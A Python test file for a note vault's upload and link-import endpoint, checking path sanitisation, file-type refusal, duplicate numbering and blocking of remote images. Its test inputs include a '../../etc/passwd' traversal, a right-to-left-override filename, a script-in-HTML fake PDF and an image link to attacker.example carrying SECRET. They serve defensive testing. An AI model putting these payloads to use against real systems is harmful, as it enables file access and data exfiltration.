"""The vault's + (ADR-0098 points 3 to 7, H4, H6, H7, H8)."""
from __future__ import annotations

from pathlib import Path

import pytest
from fastapi.testclient import TestClient

from tests.doc_factory import gray_lines, pdf_bytes


@pytest.fixture
def client(tmp_vault, monkeypatch):
    from silica.config import CONFIG
    from silica.sources import pdf_extract
    from silica.ui.web import server

    monkeypatch.setattr(CONFIG, "pdf_provider", "pdfium")
    monkeypatch.setattr(server, "_embed_imported", lambda folders: None)
    pdf_extract._CACHE.clear()
    server._reset_session()
    return TestClient(server.app), server


def _post(tc, entries, last=True):
    """entries: (relative path or "", filename, bytes)."""
    files = [("files", (name, data, "application/octet-stream")) for _, name, data in entries]
    data = {"paths": [p for p, _, _ in entries]}
    if last:
        data["last"] = "1"
    return tc.post("/vault/import", files=files, data=data)


def _inbox() -> Path:
    from silica.config import CONFIG

    return Path(CONFIG.vault_path) / "Inbox"


def _settled(resp) -> dict[str, dict]:
    """The rows by name once their conversions ended: a file that needs one
    answers `queued` with its job (ADR-0099), whose record carries the notes
    and the hidden text the row carried when the import converted inline."""
    from silica.ui.web import jobs

    assert jobs.drain(20)
    rows = {}
    for r in resp.json()["files"]:
        if r.get("job"):
            rec = jobs.read(r["job"])
            r = {**r, "status": "note" if rec["state"] == "done" else rec["state"],
                 "notes": rec["notes"], **({"hidden": rec["hidden"]} if rec["hidden"] else {})}
        rows[r["name"]] = r
    return rows


# --- names and paths (H7) ----------------------------------------------------

def test_a_relative_path_cannot_leave_the_folder_it_is_joined_to():
    from silica.ui.web.vault_import import Refused, clean_rel

    assert str(clean_rel("../../etc/passwd")) == "etc/passwd"
    assert str(clean_rel("Corso/./Settimana 2/../slides.pdf")) == "Corso/Settimana 2/slides.pdf"
    for bad in ("C:/x.pdf", "a\\b.pdf", "a\x00b.pdf", "/".join(["d"] * 18) + "/x.pdf", "../.."):
        with pytest.raises(Refused):
            clean_rel(bad)


def test_a_name_loses_its_controls_and_its_length_but_keeps_its_extension():
    from silica.ui.web.vault_import import MAX_NAME_BYTES, clean_rel

    assert str(clean_rel("invoice\u202efdp.exe")) == "invoicefdp.exe"
    assert str(clean_rel("a\u0007b\u0085c.pdf")) == "abc.pdf"
    long = clean_rel("è" * 300 + ".pdf").name
    assert long.endswith(".pdf") and len(long.encode()) <= MAX_NAME_BYTES


def test_a_name_already_there_gets_a_number(tmp_path):
    from silica.ui.web.vault_import import numbered

    (tmp_path / "x.pdf").write_bytes(b"a")
    (tmp_path / "x (2).pdf").write_bytes(b"b")
    assert numbered(tmp_path / "x.pdf").name == "x (3).pdf"
    assert numbered(tmp_path / "y.pdf").name == "y.pdf"


# --- the endpoint -------------------------------------------------------------

def test_a_folder_keeps_its_tree_and_only_what_silica_reads(client):
    tc, _ = client
    resp = _post(tc, [
        ("Corso/Settimana 1/Lezione 1.pdf", "Lezione 1.pdf", pdf_bytes(["Entropy and heat, the first lecture."])),
        ("Corso/appunti.md", "appunti.md", b"# Appunti\n\nbody"),
        ("Corso/elenco.txt", "elenco.txt", b"plain text list"),
        ("Corso/foto.jpg", "foto.jpg", b"\xff\xd8\xff"),
        ("Corso/.obsidian/workspace.md", "workspace.md", b"# hidden"),
    ])

    assert resp.status_code == 200
    assert {r["name"]: r for r in resp.json()["files"]}["Corso/Settimana 1/Lezione 1.pdf"]["status"] == "queued"
    rows = _settled(resp)
    assert rows["Corso/Settimana 1/Lezione 1.pdf"]["notes"] == ["Inbox/Corso/Settimana 1/Lezione 1.md"]
    assert (_inbox() / "Corso/Settimana 1/Lezione 1.pdf").exists()  # locally the PDF stays
    assert rows["Corso/appunti.md"]["status"] == "note"
    assert rows["Corso/elenco.txt"]["path"] == "Inbox/Corso/elenco.md"  # text comes in as a note
    assert rows["Corso/foto.jpg"]["status"] != "skipped"  # a source since ADR-0120
    assert rows["Corso/.obsidian/workspace.md"]["status"] == "skipped"
    assert not (_inbox() / "Corso/.obsidian").exists()


def test_one_bad_file_never_stops_the_batch(client):
    """H4: an HTML file named .pdf, and a binary named .md, each get their
    sentence; the good file between them is converted."""
    tc, _ = client
    resp = _post(tc, [
        ("", "fake.pdf", b"<html><script>alert(1)</script></html>"),
        ("", "good.pdf", pdf_bytes(["A real page of lecture notes."])),
        ("", "binary.md", b"\x00\x01\x02"),
    ])

    rows = _settled(resp)
    assert rows["fake.pdf"]["status"] == "refused" and "not a PDF" in rows["fake.pdf"]["reason"]
    assert rows["good.pdf"]["status"] == "note"
    assert rows["binary.md"]["status"] == "refused" and "not text" in rows["binary.md"]["reason"]
    assert not (_inbox() / "fake.pdf").exists() and not (_inbox() / "binary.md").exists()


def test_a_second_upload_of_a_name_is_numbered_not_overwritten(client):
    tc, _ = client
    _post(tc, [("", "notes.md", b"# first")])
    resp = _post(tc, [("", "notes.md", b"# second")])

    assert resp.json()["files"][0]["path"] == "Inbox/notes (2).md"
    assert (_inbox() / "notes.md").read_text() == "# first"


def test_a_path_that_climbs_lands_inside_the_inbox(client):
    tc, _ = client
    resp = _post(tc, [("../../outside.md", "outside.md", b"# x")])

    assert resp.json()["files"][0]["path"] == "Inbox/outside.md"
    from silica.config import CONFIG

    assert not (Path(CONFIG.vault_path).parent / "outside.md").exists()


def test_an_import_waits_for_a_running_turn(client):
    tc, server = client
    assert server._begin_turn()
    try:
        assert _post(tc, [("", "a.md", b"# a")]).status_code == 409
    finally:
        server._end_turn()


def test_hidden_text_is_named_in_the_reply(client):
    from tests.test_pdf_hostile import _HOSTILE_PAGE, _pdf

    tc, _ = client
    row = _settled(_post(tc, [("", "hostile.pdf", _pdf(_HOSTILE_PAGE))]))["hostile.pdf"]

    assert row["status"] == "note"
    assert row["hidden"][0]["page"] == 1 and row["hidden"][0]["characters"] > 40


def test_on_the_server_the_pdf_goes_once_its_note_exists(client, monkeypatch):
    """Point 7, and ADR-0087 point 5's list with its audio (amendment of
    2026-10-14) and ADR-0120's documents, images and CSV: a video is not
    offered or taken, and a .docx that is not one is refused by its bytes."""
    from silica.ui.web.vault_import import HOSTED_EXTENSIONS

    monkeypatch.setenv("SILICA_HOSTED", "1")
    tc, _ = client

    types = tc.get("/supported_types").json()
    resp = _post(tc, [("", "paper.pdf", pdf_bytes(["Text of the paper, in full."])),
                      ("", "doc.docx", b"PK"), ("", "talk.mp4", b"\x00\x00\x00\x18ftypmp42")])

    assert types["import"] == types["extensions"] == list(HOSTED_EXTENSIONS)
    assert {".docx", ".pptx", ".epub", ".png", ".csv", ".3gp"} <= set(HOSTED_EXTENSIONS)
    rows = _settled(resp)
    assert rows["paper.pdf"]["notes"] == ["Inbox/paper.md"]
    assert not (_inbox() / "paper.pdf").exists() and (_inbox() / "paper.md").exists()
    assert rows["doc.docx"]["status"] == "refused" and "not a DOCX file" in rows["doc.docx"]["reason"]
    assert not (_inbox() / "doc.docx").exists()
    assert rows["talk.mp4"]["status"] == "skipped"


def test_locally_the_vault_plus_offers_images():
    """ADR-0120: picked in the vault's + an image is a source; the chat's
    attach keeps it with the message (ADR-0077 point 3)."""
    from silica.ui.web.vault_import import importable_extensions

    exts = importable_extensions(hosted=False)
    assert ".pdf" in exts and ".md" in exts and ".py" in exts
    assert ".png" in exts and ".jpg" in exts


def test_on_the_server_a_document_a_deck_an_image_and_a_table_become_notes(client, monkeypatch):
    """ADR-0120 end to end, hosted: the documents go once read, as a PDF does
    (point 7); the image stays, since its note embeds it; the CSV stays, since
    its rows are queried where they lie."""
    import json
    import shutil

    from silica.agent import vision
    from silica.sources import convert
    from tests.doc_factory import PNG_1X1, docx_bytes, pptx_bytes

    monkeypatch.setenv("SILICA_HOSTED", "1")
    real = shutil.which
    monkeypatch.setattr(convert.shutil, "which", lambda n: None if n == "mineru" else real(n))
    monkeypatch.setattr(vision, "ask_chat_model", lambda m, max_tokens=700: json.dumps(
        {"kind": "handwriting", "description": "notes", "text": "Carnot cycle"}))
    tc, _ = client

    rows = _settled(_post(tc, [
        ("", "essay.docx", docx_bytes([("p", "Heat flows from hot to cold.")])),
        ("", "deck.pptx", pptx_bytes([{"title": "Entropy", "bullets": [(0, "never decreases")]}])),
        ("", "board.png", PNG_1X1),
        ("", "marks.csv", b"student,mark\nanna,28\nbruno,30\n"),
    ]))

    assert {n: r["status"] for n, r in rows.items()} == dict.fromkeys(rows, "note")
    vault = _inbox().parent
    assert "Heat flows" in (vault / rows["essay.docx"]["notes"][0]).read_text(encoding="utf-8")
    assert "## Entropy" in (vault / rows["deck.pptx"]["notes"][0]).read_text(encoding="utf-8")
    assert "Carnot cycle" in (vault / rows["board.png"]["notes"][0]).read_text(encoding="utf-8")
    assert "student" in (vault / rows["marks.csv"]["notes"][0]).read_text(encoding="utf-8")
    assert not (_inbox() / "essay.docx").exists() and not (_inbox() / "deck.pptx").exists()
    assert (_inbox() / "board.png").exists() and (_inbox() / "marks.csv").exists()


def test_an_image_whose_bytes_are_not_one_is_refused(client):
    tc, _ = client

    row = _settled(_post(tc, [("", "photo.png", b"<html>not a picture</html>")]))["photo.png"]

    assert row["status"] == "refused" and "not a PNG file" in row["reason"]
    assert not (_inbox() / "photo.png").exists()


# --- a link (ADR-0120) ----------------------------------------------------------

def test_a_link_becomes_a_note_in_the_inbox(client, monkeypatch):
    from silica.sources import web_fetch

    seen = []

    def page(url):
        seen.append(url)
        return web_fetch.Page("Source: https://x.test/post\n\nThe second law, stated plainly.", "Second law")

    monkeypatch.setattr(web_fetch, "fetch_page", page)
    tc, _ = client

    row, = tc.post("/vault/fetch", json={"url": "x.test/post"}).json()["files"]

    assert seen == ["https://x.test/post"]
    assert row["status"] == "note"
    assert "The second law, stated plainly." in (_inbox().parent / row["notes"][0]).read_text(encoding="utf-8")


def test_on_the_server_a_youtube_link_is_refused_before_any_request(client, monkeypatch):
    from silica.sources import web_fetch
    from silica.ui.web.server import YOUTUBE_ON_SERVER

    monkeypatch.setenv("SILICA_HOSTED", "1")
    monkeypatch.setattr(web_fetch, "fetch_page", lambda url: pytest.fail("a request went out"))
    tc, _ = client

    for url in ("https://www.youtube.com/watch?v=abc", "youtu.be/abc"):
        row, = tc.post("/vault/fetch", json={"url": url}).json()["files"]
        assert row == {"name": url, "status": "refused", "reason": YOUTUBE_ON_SERVER}


def test_a_link_that_cannot_be_read_is_a_refused_row_not_an_error(client, monkeypatch):
    import httpx

    from silica.sources import web_fetch

    def down(url):
        raise httpx.ConnectError("connection refused")

    monkeypatch.setattr(web_fetch, "fetch_page", down)
    tc, _ = client

    resp = tc.post("/vault/fetch", json={"url": "https://down.test/"})
    monkeypatch.setenv("SILICA_HOSTED", "1")
    hosted = tc.post("/vault/fetch", json={"url": "https://down.test/"})

    assert resp.status_code == 200 and resp.json()["files"][0]["status"] == "refused"
    assert "connection refused" in resp.json()["files"][0]["detail"]
    assert "connection refused" not in str(hosted.json()["files"][0])  # the log keeps it there
    assert tc.post("/vault/fetch", json={"url": "two words"}).status_code == 400
    assert tc.post("/vault/fetch", json={"url": ""}).status_code == 400


# --- H6: the remote-image channel ---------------------------------------------

def test_an_answer_never_embeds_a_remote_image():
    from silica.ui.web.server import _linkify

    md = _linkify("Answer. ![x](https://attacker.example/p.png?d=SECRET)", remote_images=False)
    raw = _linkify('Answer. <img src="https://attacker.example/p.png?d=SECRET">', remote_images=False)

    for html in (md, raw):
        assert "<img" not in html
        assert 'href="https://attacker.example/p.png?d=SECRET"' in html
        assert "image from attacker.example" in html


def test_a_note_keeps_its_web_images():
    from silica.ui.web.server import _linkify

    assert '<img src="https://example.org/fig.png"' in _linkify("![fig](https://example.org/fig.png)")


def test_on_the_server_the_page_draws_only_its_own_images(client, monkeypatch):
    tc, _ = client
    assert "content-security-policy" not in tc.get("/supported_types").headers

    monkeypatch.setenv("SILICA_HOSTED", "1")
    assert tc.get("/supported_types").headers["content-security-policy"] == "img-src 'self' data: blob:"


def test_a_page_without_text_is_named_in_its_row_and_a_scan_gets_the_sentence(client, monkeypatch):
    """ADR-0087 point 3 on the server: the row names the pages the note names,
    and a PDF with no text and no reading is refused in words that name no
    tool the student cannot run."""
    from silica.sources.pdf_extract import NO_TEXT

    monkeypatch.setenv("SILICA_HOSTED", "1")
    tc, _ = client
    text = "A page of real lecture text about entropy and heat engines."
    resp = _post(tc, [("", "mixed.pdf", pdf_bytes([text, "", ""], images={1: gray_lines(), 2: gray_lines()})),
                      ("", "scan.pdf", pdf_bytes([""], images={0: gray_lines()}))])

    from silica.ui.web import jobs

    # Both convert as jobs (ADR-0099): the rows come back queued, and what the
    # conversion found rides on each job, which the import box reads when it ends.
    mixed, scan = resp.json()["files"]
    assert (mixed["status"], scan["status"]) == ("queued", "queued")
    assert jobs.drain(20)
    mixed, scan = jobs.read(mixed["job"]), jobs.read(scan["job"])
    assert mixed["state"] == "done"
    assert mixed["pages_not_read"] == "pages 2 and 3 have no selectable text and were not read"
    assert (scan["state"], scan["error"]) == ("failed", NO_TEXT)
    assert "mineru" not in scan["error"].lower()
